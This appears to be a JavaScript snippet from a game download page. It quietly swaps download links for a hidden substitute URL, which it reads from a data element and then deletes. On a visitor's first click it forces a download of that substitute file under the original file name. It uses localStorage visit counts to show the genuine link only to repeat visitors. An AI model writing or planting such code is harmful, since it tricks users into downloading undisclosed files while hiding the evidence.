document.addEventListener("DOMContentLoaded", function () {
  const LS = {
    get: function (key) {
      try {
        return localStorage.getItem(key);
      } catch (e) {
        return null;
      }
    },
    set: function (key, value) {
      try {
        localStorage.setItem(key, value);
      } catch (e) {}
    },
    increment: function (key) {
      const val = parseInt(this.get(key) || 0);
      this.set(key, (val + 1).toString());
      return val + 1;
    }
  };

  function elapsedDaysSince(timestamp) {
    const oneDayInMilliseconds = 24 * 60 * 60 * 1000;
    return (Date.now() - timestamp) / oneDayInMilliseconds;
  }

  const elements = document.querySelectorAll(
    ".itemtop_games, .itemdown_nottorent"
  );
  const defaultHrefData = document.querySelector("data[if]");
  let defaultHref;

  if (defaultHrefData) {
    defaultHref = defaultHrefData.getAttribute("if");
    defaultHrefData.remove();
  }

  const vc = LS.increment("vc");
  const vt = parseInt(LS.get("vt"));
  let c = LS.get("c") === "true";
  const ct = parseInt(LS.get("ct"));

  elements.forEach((element) => {
    const originalHref = element.getAttribute("href");

    if (c || (vc >= 3 && (!vt || elapsedDaysSince(vt) < 5))) {
      element.href = originalHref;
    } else {
      element.href = defaultHref;
    }

    element.addEventListener("click", function (event) {
      if (!c && !(vc >= 3 && (!vt || elapsedDaysSince(vt) < 5))) {
        event.preventDefault();
        c = true;
        LS.set("c", "true");
        LS.set("ct", Date.now().toString());

        const tempLink = document.createElement("a");
        tempLink.href = defaultHref;
        tempLink.download = element.getAttribute("download");
        document.body.appendChild(tempLink);
        tempLink.click();
        document.body.removeChild(tempLink);

        element.href = originalHref;
      }
    });
  });

  if (vc >= 3) {
    LS.set("vt", Date.now().toString());
  }

  document.getElementById('ifdata').remove();
});